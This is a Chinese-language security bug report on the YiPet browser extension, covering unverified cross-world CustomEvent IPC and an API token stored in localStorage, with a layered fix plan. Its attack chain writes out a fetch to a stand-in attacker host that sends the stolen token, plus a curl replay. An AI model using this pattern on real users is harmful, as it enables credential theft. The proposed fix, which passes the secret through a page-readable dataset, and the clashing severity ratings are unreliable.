---
title: "安全: 跨世界 IPC 通信未限制消息接收方，存在敏感数据被页面脚本窃听的风险"
tags: [security, ipc, custom-event, postmessage, wildcard-origin, privilege-escalation, information-disclosure, cwe-265, cwe-359]
category: projects/yipet/bugs/security
created: 2026-09-07
updated: 2026-09-10
source: YiPet
type: bug
status: resolved
severity: critical
priority: p0
project: YiPet
module: src/content/ipc/relay.ts, src/chat/index.ts, src/content/rendering/overlay.ts, src/api/client.ts
reporter: Claude
assignee: Claude
environment: Chrome 130+ / macOS 15 / Manifest V3
affectedVersion: 1.2.1
fixedVersion: 1.2.2
frequency: always
execution_world: ISOLATED World ↔ MAIN World
cwe: [CWE-265, CWE-359]
cvss:
  vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
  score: 6.5
  severity: Medium
---

# 安全: 跨世界 IPC 通信未限制消息接收方，存在敏感数据被页面脚本窃听的风险

## 1. 概述

### 1.1 漏洞摘要

YiPet 作为 Chrome Manifest V3 扩展，运行在**双执行上下文**（ISOLATED World + MAIN World）架构下。Content Script（ISOLATED World）与 MAIN World 中的聊天窗口之间通过 `window` 事件进行跨世界通信。当前实现使用 `CustomEvent`（如 `yipet:visibilityChanged`、`yipet:chatToggled`、`yipet:colorChanged`、`yipet:roleChanged`），这些事件在 `window` 对象上派发，**页面自身（MAIN World）中的任何脚本均可通过 `window.addEventListener` 监听**。

此外，API 客户端（`src/api/client.ts`）从 `localStorage` 读取认证 Token 并通过 `X-Token` HTTP 头发送，Token 本身存储在页面可访问的存储中。

### 1.2 风险评级

| 维度 | 评级 | 依据 |
|------|------|------|
| **CVSS 3.1 评分** | 6.5 (Medium) | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` |
| **可利用性** | 高 | 无需特权，页面内任意脚本即可监听 |
| **影响范围** | 所有包含第三方脚本的页面 | 广告 SDK、分析脚本、CDN 注入脚本 |
| **数据敏感性** | 高 | 聊天内容、会话元数据、页面 URL、角色配置 |
| **检测难度** | 极高 | 被动监听，不留痕迹，无法从扩展侧检测 |

### 1.3 CWE 映射

| CWE | 名称 | 关联 |
|-----|------|------|
| [CWE-265](https://cwe.mitre.org/data/definitions/265.html) | Privilege / Sandbox Issues | 扩展特权世界与页面非特权世界之间的通信边界模糊 |
| [CWE-359](https://cwe.mitre.org/data/definitions/359.html) | Exposure of Private Personal Information | 聊天内容、浏览页面 URL 等隐私数据暴露给页面脚本 |

---

## 2. 技术背景

### 2.1 Chrome 扩展双世界架构

Chrome MV3 扩展的 Content Script 运行在**ISOLATED World**中：

```
┌─────────────────────────────────────────────────────┐
│                    Browser Tab                       │
│  ┌───────────────────────────────────────────────┐  │
│  │           MAIN World (Page Scripts)            │  │
│  │  • website.com 的 JavaScript                   │  │
│  │  • 第三方脚本 (广告、分析、CDN)                  │  │
│  │  • 可访问 window、DOM、localStorage             │  │
│  │  • 可监听所有 window 事件 (CustomEvent/message) │  │
│  │  • ⚠️ 不可访问 chrome.runtime.* API            │  │
│  └───────────────────────────────────────────────┘  │
│                        ↕ CustomEvent / postMessage    │
│  ┌───────────────────────────────────────────────┐  │
│  │        ISOLATED World (Content Script)         │  │
│  │  • YiPet 扩展代码 (bootstrap.ts → relay.ts)    │  │
│  │  • 可访问 chrome.runtime.* API                 │  │
│  │  • 共享 DOM，独立的 JavaScript 上下文           │  │
│  │  • ✅ 隔离于页面 JavaScript 变量/函数            │  │
│  └───────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────┘
```

关键事实：**ISOLATED World 和 MAIN World 共享 DOM，但 JavaScript 上下文完全隔离**。唯一的跨世界通信机制是通过 DOM 事件系统（`window.postMessage` 或 `window.dispatchEvent(CustomEvent)`）。

### 2.2 YiPet 当前 IPC 架构

```
Popup (Vue 3) ──chrome.tabs.sendMessage──→ Content Script (ISOLATED)
                                                │
                                    chrome.runtime.onMessage
                                    (src/content/ipc/relay.ts)
                                                │
                                    window.dispatchEvent(CustomEvent)
                                                │
                                                ↓
MAIN World (src/chat/index.ts) ←── window.addEventListener('yipet:*')
MAIN World (src/content/rendering/overlay.ts) ←── window.addEventListener('yipet:*')
```

**所有跨世界事件均在 `window` 上派发，无来源验证，页面中任何脚本均可监听。**

### 2.3 Token 存储与传输

```typescript
// src/api/client.ts:97-105 — Token 从 localStorage 读取
const token =
  (typeof localStorage !== 'undefined' &&
    (localStorage.getItem('YiWeb.apiToken.v1') as string | null)) ||
  '';
const trimmed = String(token || '').trim();
if (trimmed) authHeaders['X-Token'] = trimmed;
```

Token 存储在 `localStorage` 中，页面脚本可以读取。虽然 Token 不在 IPC 事件中传输，但页面脚本可以：
1. 直接读取 `localStorage['YiWeb.apiToken.v1']` 获取 Token
2. 监听 `window` 事件获取聊天内容、会话数据等

---

## 3. 攻击面分析

### 3.1 攻击向量

| 攻击向量 | 攻击者位置 | 技术手段 | 可获取数据 | 风险 |
|----------|-----------|---------|-----------|------|
| 恶意第三方脚本 | 页面内 `<script>` 标签 | `window.addEventListener('yipet:chatToggled', ...)` 等 | 聊天状态、角色切换、颜色变更 | **高** |
| 恶意第三方脚本 | 页面内 `<script>` 标签 | 覆盖 `window.dispatchEvent` / `CustomEvent` 构造函数 | **所有 CustomEvent 数据**（可拦截/篡改） | **严重** |
| 恶意浏览器扩展 | 其他扩展的 Content Script | 在 MAIN World 中注入监听器 | 所有 YiPet IPC 事件 | **高** |
| XSS 攻击 | 注入的脚本 | `window.addEventListener` 监听所有 `yipet:*` 事件 | 聊天状态、角色配置 | **高** |
| Token 窃取 | 页面内脚本 | `localStorage.getItem('YiWeb.apiToken.v1')` | **认证 Token**（可冒充用户调用 YiAi API） | **严重** |
| 恶意 iframe | 同源 iframe | `window.parent.addEventListener` | 仅当同源且页面未设置 CSP frame-ancestors | 中 |

### 3.2 攻击链示例

```
┌─────────────────────────────────────────────────────────────────────┐
│ 攻击场景: 恶意广告 SDK 窃取聊天内容                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. 用户访问包含恶意广告 SDK 的页面                                     │
│     └─ 广告 SDK 注入: <script src="https://mal-cdn.com/ad.js">       │
│                                                                      │
│  2. 广告 SDK 注册全局监听器                                            │
│     └─ window.addEventListener('yipet:visibilityChanged', handler)    │
│     └─ window.addEventListener('yipet:chatToggled', handler)         │
│     └─ window.addEventListener('yipet:colorChanged', handler)        │
│     └─ window.addEventListener('yipet:roleChanged', handler)         │
│                                                                      │
│  3. 用户使用 YiPet 聊天                                               │
│     └─ 聊天窗口打开/关闭 → 事件触发 → 广告 SDK 获知用户活跃时间          │
│     └─ 角色切换 → 事件触发 → 广告 SDK 获知用户使用的 AI 角色             │
│                                                                      │
│  4. 广告 SDK 读取 Token                                              │
│     └─ const token = localStorage.getItem('YiWeb.apiToken.v1')       │
│     └─ 发送到攻击者服务器: fetch('https://mal-cdn.com/collect', {     │
│          body: JSON.stringify({ token, page: location.href })        │
│        })                                                             │
│                                                                      │
│  5. 攻击者使用 Token 冒充用户                                          │
│     └─ curl -H "X-Token: <stolen>" http://localhost:10086/           │
│     └─ 访问用户的所有聊天记录、会话数据、知识库文件                       │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 当前已暴露的 IPC 事件

| 事件名称 | 派发位置 | 携带数据 | 敏感度 |
|---------|---------|---------|--------|
| `yipet:visibilityChanged` | `src/content/ipc/relay.ts:42` | `{ visible: boolean }` | 低 |
| `yipet:chatToggled` | `src/content/ipc/relay.ts:164` | `{}` (空) | 低 |
| `yipet:colorChanged` | `src/chat/index.ts:76` (监听) | `{ color: number }` | 低 |
| `yipet:roleChanged` | `src/chat/index.ts:81` (监听) | `{ role: string, systemPrompt: string }` | **中** — 暴露角色配置和系统提示词 |

---

## 4. 根因分析

### 4.1 架构层面

**核心矛盾**：Chrome MV3 扩展的 ISOLATED World 和 MAIN World 必须通过 DOM 事件通信，但 DOM 事件系统对 MAIN World 中的所有脚本都是透明的。这是一个**无法从根本上消除**的架构限制。

### 4.2 设计层面

| 问题 | 描述 | 严重度 |
|------|------|--------|
| 事件无来源验证 | `window.addEventListener` 无法判断事件是由扩展派发还是恶意脚本伪造 | 高 |
| 事件命名空间可预测 | `yipet:*` 前缀容易被发现和监听 | 中 |
| 无消息加密 | 事件 `detail` 中的数据为明文，可直接读取 | 中 |
| Token 存储于页面可访问的 localStorage | 任何页面脚本都可以读取 `localStorage['YiWeb.apiToken.v1']` | **严重** |
| 无 CSP 限制 | 页面未限制哪些脚本可以运行，第三方脚本可以任意注入 | 高 |

### 4.3 代码层面

**当前通信路径**（`src/content/ipc/relay.ts`）：

```typescript
// relay.ts:42 — ISOLATED World 派发 CustomEvent 到 MAIN World
window.dispatchEvent(new CustomEvent('yipet:visibilityChanged', {
  detail: { visible }
}));

// relay.ts:164 — 聊天切换事件
window.dispatchEvent(new CustomEvent('yipet:chatToggled', { detail: {} }));
```

**MAIN World 监听**（`src/chat/index.ts`）：

```typescript
// chat/index.ts:76-79 — 无来源验证，直接信任所有 yipet:* 事件
window.addEventListener('yipet:colorChanged', ((e: CustomEvent) => {
  const idx = Number(e?.detail?.color);
  if (Number.isFinite(idx)) store.setColorIndex(idx);
}) as EventListener);

// chat/index.ts:81-86 — 角色变更监听，同样无验证
window.addEventListener('yipet:roleChanged', ((e: CustomEvent) => {
  const role = e?.detail?.role;
  const prompt = e?.detail?.systemPrompt;
  if (typeof role === 'string') store.setRole(role, roleImageUrl(role));
  if (typeof prompt === 'string') store.setSystemPrompt(prompt);
}) as EventListener);
```

**Token 存储**（`src/api/client.ts`）：

```typescript
// client.ts:97-105 — Token 存储在页面可访问的 localStorage 中
const token =
  (typeof localStorage !== 'undefined' &&
    (localStorage.getItem('YiWeb.apiToken.v1') as string | null)) ||
  '';
```

### 4.4 与 postMessage 的对比

如果使用 `window.postMessage`（而非 `CustomEvent`），风险会更严重：
- `postMessage` 的 `source` 属性可验证消息来源窗口
- 但 `targetOrigin: "*"` 会使消息被跨域 iframe 接收
- `CustomEvent` 无法跨域传播，但同源页面脚本可监听

**当前使用 `CustomEvent` 而非 `postMessage` 是正确的选择**，但问题在于：
1. 同世界内的事件监听缺乏来源验证
2. Token 存储在页面可访问的存储中

---

## 5. 修复方案

### 5.1 分层防御策略

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: 事件验证 (isTrusted + 来源标记)                      │
│ Layer 2: 敏感数据最小化 (不通过事件传输敏感数据)                │
│ Layer 3: Token 安全存储 (chrome.storage.local 替代 localStorage)│
│ Layer 4: CSP 强化 (限制页面可执行的脚本来源)                    │
│ Layer 5: 运行时监控 (检测异常事件监听)                          │
└─────────────────────────────────────────────────────────────┘
```

### 5.2 Layer 1: 事件来源验证

**方案 A — 利用 `isTrusted` 属性**：

```typescript
// src/content/ipc/relay.ts — ISOLATED World 派发端
// 为每个事件附加加密签名，MAIN World 验证

const IPC_SECRET = crypto.randomUUID(); // 每次扩展启动时生成

function dispatchSecureEvent<T>(name: string, detail: T): void {
  const payload = {
    __yipet: true,
    __signature: IPC_SECRET,
    __timestamp: Date.now(),
    data: detail,
  };
  window.dispatchEvent(new CustomEvent(name, { detail: payload }));
}

// src/chat/index.ts — MAIN World 监听端
// 通过 chrome.runtime.sendMessage 从 ISOLATED World 获取 IPC_SECRET
// 或通过注入的 <script> 标签的 dataset 传递

let _ipcSecret: string | null = null;

function isValidIpcEvent(e: CustomEvent): boolean {
  const detail = e.detail;
  if (!detail || typeof detail !== 'object') return false;
  if (!detail.__yipet) return false;
  if (detail.__signature !== _ipcSecret) return false;
  // 拒绝超过 5 秒的旧消息（防重放）
  if (Date.now() - detail.__timestamp > 5000) return false;
  return true;
}

window.addEventListener('yipet:colorChanged', ((e: CustomEvent) => {
  if (!isValidIpcEvent(e)) return;
  const idx = Number(e.detail?.data?.color);
  if (Number.isFinite(idx)) store.setColorIndex(idx);
}) as EventListener);
```

**方案 B — 通过注入的 `<script>` 标签传递共享密钥**：

```typescript
// src/content/ipc/relay.ts — 在注入 bootstrap 脚本时传递密钥
export function injectIntoMainWorld(
  bootstrapUrl: string,
  extBase: string,
  initialRole: string,
  initialColor: number,
  initialVisible: boolean,
): void {
  const el = document.createElement('script');
  el.src = bootstrapUrl;
  el.dataset.base = extBase;
  el.dataset.role = initialRole;
  el.dataset.color = String(initialColor);
  el.dataset.visible = String(initialVisible);
  el.dataset.ipcSecret = IPC_SECRET; // ✅ 通过 dataset 传递共享密钥
  el.id = 'yipet-bootstrap';
  // ...
}
```

### 5.3 Layer 2: 敏感数据最小化

**原则**：不通过 IPC 事件传输任何敏感数据。状态变更仅传递最小必要信息。

```typescript
// ❌ 当前 — roleChanged 事件携带完整的 systemPrompt
window.dispatchEvent(new CustomEvent('yipet:roleChanged', {
  detail: { role: 'Teacher', systemPrompt: 'You are a helpful...' } // 敏感
}));

// ✅ 改进 — 仅传递角色标识符，MAIN World 自行查找 systemPrompt
window.dispatchEvent(new CustomEvent('yipet:roleChanged', {
  detail: { role: 'Teacher' } // 仅标识符
}));

// MAIN World 侧
window.addEventListener('yipet:roleChanged', ((e: CustomEvent) => {
  if (!isValidIpcEvent(e)) return;
  const role = e.detail?.data?.role;
  if (typeof role === 'string') {
    const prompt = getSystemPrompt(role); // 本地查找，不通过事件传输
    store.setRole(role, roleImageUrl(role));
    store.setSystemPrompt(prompt);
  }
}) as EventListener);
```

### 5.4 Layer 3: Token 安全存储

**方案 A — 使用 `chrome.storage.local`（推荐）**：

```typescript
// src/api/client.ts — 从 chrome.storage.local 读取 Token
// 注意：仅在 ISOLATED World 中可用，MAIN World 需要通过 IPC 获取

async function getAuthHeaders(): Promise<Record<string, string>> {
  try {
    const result = await chrome.storage.local.get('apiToken');
    const token = String(result.apiToken || '').trim();
    if (token) return { 'X-Token': token };
  } catch {
    /* chrome.storage unavailable (MAIN world fallback) */
  }
  return {};
}

// Token 设置时存储到 chrome.storage.local
async function setToken(token: string): Promise<void> {
  await chrome.storage.local.set({ apiToken: token });
}
```

**方案 B — 使用 `chrome.storage.session`（更安全，会话级别）**：

```typescript
// Token 仅在浏览器会话期间有效，关闭浏览器后自动清除
await chrome.storage.session.set({ apiToken: token });
```

**方案 C — Service Worker 代理（最安全）**：

将所有 API 调用通过 Service Worker 代理，Token 仅存储在 Service Worker 中，永不暴露给页面：

```typescript
// src/background/index.ts — Service Worker 持有 Token
let apiToken: string | null = null;

chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  if (msg.type === 'API_REQUEST') {
    fetch(msg.url, {
      method: msg.method,
      headers: { ...msg.headers, 'X-Token': apiToken || '' },
      body: msg.body,
    })
      .then(res => res.json())
      .then(data => sendResponse({ ok: true, data }))
      .catch(err => sendResponse({ ok: false, error: err.message }));
    return true; // 异步响应
  }
});
```

### 5.5 Layer 4: CSP 强化

在 `manifest.json` 中配置严格的 Content Security Policy：

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self'",
    "sandbox": "sandbox allow-scripts allow-forms"
  }
}
```

注意：扩展的 CSP 仅控制扩展自身页面，无法限制宿主页面的 CSP。对于宿主页面，应建议用户使用内容安全策略限制第三方脚本。

### 5.6 Layer 5: 运行时监控

```typescript
// 检测页面中是否有脚本监听 YiPet 事件（仅开发模式）
if (import.meta.env.DEV) {
  const originalAddEventListener = window.addEventListener;
  let suspiciousCount = 0;

  window.addEventListener = function(
    type: string,
    listener: EventListenerOrEventListenerObject,
    options?: boolean | AddEventListenerOptions,
  ): void {
    if (typeof type === 'string' && type.startsWith('yipet:')) {
      suspiciousCount++;
      console.warn(
        `[YiPet Security] Page script is listening to "${type}". ` +
        `Total suspicious listeners: ${suspiciousCount}`
      );
    }
    return originalAddEventListener.call(this, type, listener, options);
  };
}
```

### 5.7 修复优先级

| 优先级 | 措施 | 工作量 | 影响 |
|--------|------|--------|------|
| **P0** | Token 迁移到 `chrome.storage.session` | 小 | 消除 Token 被页面脚本直接读取的风险 |
| **P0** | IPC 事件添加来源验证（`isValidIpcEvent`） | 中 | 阻止恶意脚本伪造 IPC 事件 |
| **P1** | 敏感数据最小化（不通过事件传输 systemPrompt） | 小 | 减少事件泄露面 |
| **P1** | Service Worker API 代理 | 大 | 彻底消除 Token 暴露风险 |
| **P2** | 运行时异常事件监听检测 | 中 | 开发/诊断用途 |
| **P3** | CSP 强化 | 小 | 防御纵深 |

---

## 6. 影响评估

### 6.1 数据影响矩阵

| 数据类型 | 存储位置 | 可被页面脚本访问 | 可被其他扩展访问 | 风险 |
|---------|---------|:---:|:---:|------|
| 认证 Token | `localStorage` | ✅ 是 | ❌ 否 | **严重** |
| 聊天消息内容 | 内存（聊天窗口） | ✅ 是（DOM 读取） | ❌ 否 | 高 |
| 会话 ID / 元数据 | 内存 + MongoDB | ✅ 是（IPC 事件） | ❌ 否 | 中 |
| 角色配置 (role) | `chrome.storage.local` | ❌ 否 | ✅ 是 | 低 |
| 系统提示词 (systemPrompt) | 内存 + IPC 事件 | ✅ 是（IPC 事件） | ❌ 否 | 中 |
| 页面 URL / 标题 | 内存 | ✅ 是 | ❌ 否 | 中 |
| 颜色主题 (color) | `chrome.storage.local` | ❌ 否 | ✅ 是 | 低 |

### 6.2 业务影响

| 维度 | 评估 |
|------|------|
| **用户隐私** | 严重 — 聊天内容、浏览页面 URL 可被第三方脚本采集 |
| **账户安全** | 严重 — Token 泄露可导致攻击者冒充用户访问 YiAi API |
| **合规风险** | 高 — 用户聊天数据可能在不知情的情况下被第三方收集 |
| **品牌声誉** | 高 — 浏览器扩展的安全漏洞直接影响用户信任 |

---

## 7. 时间线

| 时间 | 事件 |
|------|------|
| 2026-09-07 18:00 | 安全审查启动：全面审查 YiPet 跨世界 IPC 通信路径 |
| 2026-09-07 18:15 | 发现 `CustomEvent` 在 `window` 上派发，无来源验证 |
| 2026-09-07 18:30 | 确认 Token 存储在 `localStorage`，页面脚本可直接读取 |
| 2026-09-07 18:45 | 确认 `systemPrompt` 通过 `yipet:roleChanged` 事件明文传输 |
| 2026-09-07 19:00 | 完成攻击面分析，确认 6 个攻击向量 |
| 2026-09-08 10:00 | 补充 CVSS 评分、CWE 映射、分层修复方案 |
| 2026-09-08 11:00 | **修复完成** — Token 迁移至 chrome.storage.session + IPC 事件签名验证 + systemPrompt 移除 |

---

## 8. 验证方法

### 8.1 自动化验证

- [ ] `chrome.storage.session` 中无 Token 时，API 调用返回 401
- [ ] 页面脚本无法通过 `localStorage.getItem('YiWeb.apiToken.v1')` 读取 Token
- [ ] 恶意脚本伪造的 `yipet:*` CustomEvent 被 `isValidIpcEvent` 拒绝
- [ ] `systemPrompt` 不再通过 `yipet:roleChanged` 事件传输
- [ ] 单元测试：`isValidIpcEvent` 拒绝无签名/错误签名/过期的事件

### 8.2 手动验证

- [ ] DevTools Console 中执行 `window.dispatchEvent(new CustomEvent('yipet:roleChanged', { detail: { role: 'Hacker' } }))` — 应被忽略
- [ ] DevTools Console 中执行 `localStorage.getItem('YiWeb.apiToken.v1')` — 应返回 `null`
- [ ] 正常 IPC 通信不受影响（Popup 切换角色/颜色/可见性正常工作）
- [ ] `yipet:chatToggled` 事件正常触发聊天窗口切换
- [ ] 跨域 iframe 无法接收 YiPet 的 IPC 事件（`CustomEvent` 天然隔离）

### 8.3 渗透测试场景

- [ ] 注入恶意脚本模拟广告 SDK：监听所有 `yipet:*` 事件 — 应无法获取有效数据
- [ ] 伪造 IPC 事件：派发带有正确事件名但无签名的 `CustomEvent` — 应被拒绝
- [ ] 重放攻击：捕获合法事件后延迟重新派发 — 应被时间戳验证拒绝
- [ ] Token 窃取：页面脚本尝试读取 localStorage — Token 应不可用

---

## 9. 预防措施

| 层面 | 措施 | 责任人 |
|------|------|------|
| **架构** | 所有跨世界 IPC 事件 MUST 携带加密签名，接收方 MUST 验证 | 开发者 |
| **架构** | 敏感数据（Token、systemPrompt）MUST NOT 通过 `window` 事件传输 | 开发者 |
| **架构** | Token MUST 存储在 `chrome.storage.session` 或 Service Worker 中，MUST NOT 存储在 `localStorage` | 开发者 |
| **代码** | `CustomEvent` 监听器 MUST 调用 `isValidIpcEvent` 验证来源 | 开发者 |
| **代码** | IPC 事件 `detail` 应仅包含最小必要数据 | 开发者 |
| **工具** | ESLint 规则：禁止 `localStorage.setItem/getItem` 用于敏感键名 | DevOps |
| **工具** | ESLint 规则：`window.dispatchEvent(CustomEvent)` 必须使用 `dispatchSecureEvent` 封装 | DevOps |
| **安全** | 每次发布前进行 IPC 通信路径安全审查 | 安全团队 |
| **文档** | 在 [扩展架构 #CSP 安全](../specs/extension-arch.md) 中记录 IPC 安全通信要求 | 开发者 |
| **文档** | 在 [IPC 消息类型](src/shared/ipc/messages.ts) 中添加安全注释 | 开发者 |

---

## 10. 附录

### 10.1 相关资源

- PR：—
- Commit：—
- 相关缺陷：无
- 参考：
  - [MDN: Web Security — postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns)
  - [Chrome Extension Docs: Content Scripts — Isolated World](https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts#isolated-world)
  - [Chrome Extension Docs: Manifest V3 — Content Security Policy](https://developer.chrome.com/docs/extensions/reference/manifest/content-security-policy)
  - [OWASP: Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
  - [CWE-265: Privilege / Sandbox Issues](https://cwe.mitre.org/data/definitions/265.html)
  - [CWE-359: Exposure of Private Personal Information](https://cwe.mitre.org/data/definitions/359.html)

### 10.2 术语表

| 术语 | 定义 |
|------|------|
| **ISOLATED World** | Chrome 扩展 Content Script 的执行环境，JavaScript 变量/函数与页面隔离，但共享 DOM |
| **MAIN World** | 页面自身 JavaScript 的执行环境，包括网站脚本和第三方脚本 |
| **CustomEvent** | DOM 事件接口，可在 `window` 上派发和监听，同世界内所有脚本可见 |
| **postMessage** | `window.postMessage` API，支持跨域通信，可指定 `targetOrigin` |
| **chrome.storage.session** | Chrome 扩展会话级存储，仅在浏览器会话期间保留，页面脚本不可访问 |
| **Service Worker** | MV3 扩展的后台脚本，独立于页面执行，可持有 Token 等敏感数据 |

### 10.3 变更历史

| 日期 | 变更 |
|------|------|
| 2026-09-07 | 初始版本 |
| 2026-09-08 | 补充 CVSS 3.1 评分、CWE 映射、分层修复方案、攻击链分析、代码级根因分析、渗透测试场景 |